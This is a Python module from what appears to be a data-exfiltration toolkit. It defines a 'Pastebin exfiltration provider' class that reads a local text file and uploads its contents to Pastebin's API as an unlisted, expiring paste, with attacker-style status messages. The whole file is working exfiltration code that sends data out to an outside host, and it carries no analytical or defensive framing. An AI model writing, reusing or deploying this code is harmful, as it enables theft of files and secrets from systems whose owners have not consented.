#!/usr/bin/env python3
"""
Pastebin provider
"""

from .base_provider import BaseCloudProvider

class PastebinProvider(BaseCloudProvider):
    """Pastebin exfiltration provider"""
    
    def __init__(self):
        """Initialize Pastebin provider"""
        super().__init__('Pastebin')
        self.api_url = 'https://pastebin.com/api/api_post.php'
    
    def upload_file(self, filepath, api_key=None, expire='1W', private=True):
        """
        Upload file content to Pastebin
        
        Args:
            filepath: Path to file (text files only)
            api_key: Pastebin API key (optional for public pastes)
            expire: Expiration time ('10M', '1H', '1D', '1W', '2W', '1M', 'N')
            private: Whether paste is private (unlisted)
            
        Returns:
            Paste URL or None
        """
        try:
            import requests
            
            print(f"[*] Exfiltrating to Pastebin")
            
            # Read file content
            with open(filepath, 'r') as f:
                data = f.read()
            
            # Check size (Pastebin limit: ~512KB)
            if len(data) > 512000:
                print(f"[-] File too large for Pastebin (max ~512KB)")
                print(f"[-] File size: {len(data)} bytes")
                return None
            
            print(f"[*] Data size: {len(data)} bytes")
            
            return self.upload_text(data, api_key, expire, private)
        
        except UnicodeDecodeError:
            print(f"[-] File is not text (use for text files only)")
            return None
        except Exception as e:
            print(f"[-] Pastebin error: {e}")
            return None
    
    def upload_text(self, data, api_key=None, expire='1W', private=True):
        """
        Upload text data to Pastebin
        
        Args:
            data: Text data to upload
            api_key: Pastebin API key
            expire: Expiration time
            private: Whether paste is private
            
        Returns:
            Paste URL or None
        """
        try:
            import requests
            
            payload = {
                'api_option': 'paste',
                'api_dev_key': api_key or 'public',
                'api_paste_code': data,
                'api_paste_private': '1' if private else '0',  # 0=public, 1=unlisted, 2=private
                'api_paste_expire_date': expire
            }
            
            print(f"[*] Uploading to Pastebin...")
            
            response = requests.post(self.api_url, data=payload)
            
            if response.status_code == 200 and response.text.startswith('http'):
                paste_url = response.text.strip()
                
                print(f"[+] Upload successful!")
                print(f"[+] URL: {paste_url}")
                print(f"[+] Expires: {expire}")
                print(f"[+] Privacy: {'Unlisted' if private else 'Public'}")
                
                return {
                    'service': self.service_name,
                    'url': paste_url,
                    'size_bytes': len(data),
                    'expiration': expire,
                    'private': private
                }
            else:
                print(f"[-] Upload failed: {response.text}")
                return None
        
        except ImportError:
            print("[-] requests not installed")
            print("[!] Install: pip install requests")
            return None
        except Exception as e:
            print(f"[-] Pastebin error: {e}")
            return None
    
    def check_credentials(self, api_key):
        """Verify Pastebin API key (basic check)"""
        # Pastebin doesn't have a simple validation endpoint
        # This is a placeholder
        return api_key is not None and len(api_key) > 10